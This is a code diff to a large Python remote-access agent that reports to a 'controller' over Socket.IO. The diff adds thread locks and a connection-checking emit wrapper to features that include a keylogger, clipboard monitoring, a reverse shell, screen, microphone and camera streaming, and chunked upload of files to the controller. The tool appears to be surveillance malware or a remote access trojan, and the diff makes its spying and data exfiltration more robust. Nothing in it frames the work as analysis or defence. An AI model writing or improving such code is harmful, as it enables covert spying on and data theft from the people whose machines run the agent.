@@ -680,6 +680,44 @@ CAMERA_CAPTURE_QUEUE_SIZE = 5
 CAMERA_ENCODE_QUEUE_SIZE = 5
 TARGET_CAMERA_FPS = 30
 
+# Thread safety locks for start/stop functions
+_stream_lock = threading.Lock()
+_audio_stream_lock = threading.Lock()
+_camera_stream_lock = threading.Lock()
+_keylogger_lock = threading.Lock()
+_clipboard_lock = threading.Lock()
+_reverse_shell_lock = threading.Lock()
+_voice_control_lock = threading.Lock()
+
+# Safe Socket.IO emit wrapper with connection checking
+def safe_emit(event_name, data, retry=False):
+    """
+    Thread-safe Socket.IO emit with connection checking.
+    
+    Args:
+        event_name: Event name to emit
+        data: Data to send
+        retry: If True, buffer failed emits for retry
+        
+    Returns:
+        bool: True if emit succeeded, False otherwise
+    """
+    if not SOCKETIO_AVAILABLE or sio is None:
+        return False
+    
+    if not sio.connected:
+        return False
+    
+    try:
+        sio.emit(event_name, data)
+        return True
+    except Exception as e:
+        error_msg = str(e)
+        # Silence connection errors
+        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+            log_message(f"Emit '{event_name}' failed: {e}", "warning")
+        return False
+
 # Other global variables
 CLIPBOARD_MONITOR_ENABLED = False
 CLIPBOARD_MONITOR_THREAD = None
@@ -5458,7 +5496,12 @@ def stream_screen_simple_socketio(agent_id):
 
 def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
-    if not STREAMING_ENABLED:
+    
+    with _stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if STREAMING_ENABLED:
+            log_message("Screen streaming already running", "warning")
+            return
+        
         STREAMING_ENABLED = True
         # Use a safe wrapper that defers until functions are defined
         STREAM_THREAD = threading.Thread(target=_run_screen_stream, args=(agent_id,))
@@ -5468,7 +5511,11 @@ def start_streaming(agent_id):
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD
-    if STREAMING_ENABLED:
+    
+    with _stream_lock:  # ✅ THREAD-SAFE
+        if not STREAMING_ENABLED:
+            return
+        
         STREAMING_ENABLED = False
         if STREAM_THREAD:
             STREAM_THREAD.join(timeout=2)
@@ -5481,7 +5528,11 @@ def start_audio_streaming(agent_id):
     import queue
     import threading
     
-    if not AUDIO_STREAMING_ENABLED:
+    with _audio_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if AUDIO_STREAMING_ENABLED:
+            log_message("Audio streaming already running", "warning")
+            return
+        
         AUDIO_STREAMING_ENABLED = True
         
         # Try WebRTC first for low latency
@@ -5515,7 +5566,10 @@ def stop_audio_streaming():
     """Stop modern Opus audio streaming pipeline."""
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREADS, audio_capture_queue, audio_encode_queue
     
-    if AUDIO_STREAMING_ENABLED:
+    with _audio_stream_lock:  # ✅ THREAD-SAFE
+        if not AUDIO_STREAMING_ENABLED:
+            return
+        
         AUDIO_STREAMING_ENABLED = False
         
         # Wait for all threads to stop
@@ -5531,7 +5585,11 @@ def start_camera_streaming(agent_id):
     """Start smart camera streaming that automatically chooses WebRTC or Socket.IO."""
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS
     
-    if not CAMERA_STREAMING_ENABLED:
+    with _camera_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if CAMERA_STREAMING_ENABLED:
+            log_message("Camera streaming already running", "warning")
+            return
+        
         CAMERA_STREAMING_ENABLED = True
         
         # Try WebRTC first for low latency
@@ -5552,7 +5610,10 @@ def stop_camera_streaming():
     """Stop modern H.264 camera streaming pipeline."""
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue
     
-    if CAMERA_STREAMING_ENABLED:
+    with _camera_stream_lock:  # ✅ THREAD-SAFE
+        if not CAMERA_STREAMING_ENABLED:
+            return
+        
         CAMERA_STREAMING_ENABLED = False
         
         # Wait for all threads to stop
@@ -7270,23 +7331,30 @@ def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
             if not chunk:
                 break
             chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
-            sio.emit('file_chunk_from_agent', {
+            
+            # ✅ SAFE EMIT: Check connection before sending
+            if not safe_emit('file_chunk_from_agent', {
                 'agent_id': agent_id,
                 'filename': filename,
                 'chunk': chunk_b64,
                 'offset': offset,
                 'total_size': total_size,
                 'destination_path': destination_path or file_path
-            })
+            }):
+                log_message(f"Failed to send chunk {chunk_count}, connection lost", "error")
+                return f"File upload failed at chunk {chunk_count}: Connection lost"
+            
             offset += len(chunk)
             chunk_count += 1
             log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
+    
     # Notify upload complete
-    sio.emit('upload_file_end', {
+    if not safe_emit('upload_file_end', {
         'agent_id': agent_id,
         'filename': filename,
         'destination_path': destination_path or file_path
-    })
+    }):
+        log_message("Failed to send upload completion notification", "warning")
     log_message(f"File upload complete notification sent for {filename}")
     return f"File {file_path} sent to controller in {chunk_count} chunks"
 
@@ -11702,8 +11770,12 @@ def agent_main():
                 # Manually register agent with controller
                 try:
                     log_message(f"[INFO] Registering agent {agent_id} with controller...")
-                    sio.emit('agent_connect', {'agent_id': agent_id})
-                    log_message(f"[OK] Agent {agent_id} registration sent to controller")
+                    
+                    # ✅ SAFE EMIT: Critical registration path
+                    if not safe_emit('agent_connect', {'agent_id': agent_id}):
+                        log_message(f"[ERROR] Failed to send agent registration - connection issue", "error")
+                    else:
+                        log_message(f"[OK] Agent {agent_id} registration sent to controller")
                     
                     # Send system info to controller
                     system_info = {
@@ -11719,8 +11791,12 @@ def agent_main():
                             'webrtc': AIORTC_AVAILABLE
                         }
                     }
-                    sio.emit('agent_info', system_info)
-                    log_message(f"[OK] Agent system info sent to controller")
+                    
+                    # ✅ SAFE EMIT: Critical system info
+                    if not safe_emit('agent_info', system_info):
+                        log_message(f"[ERROR] Failed to send system info - connection issue", "error")
+                    else:
+                        log_message(f"[OK] Agent system info sent to controller")
                     
                 except Exception as reg_error:
                     log_message(f"[WARN] Failed to register agent: {reg_error}")
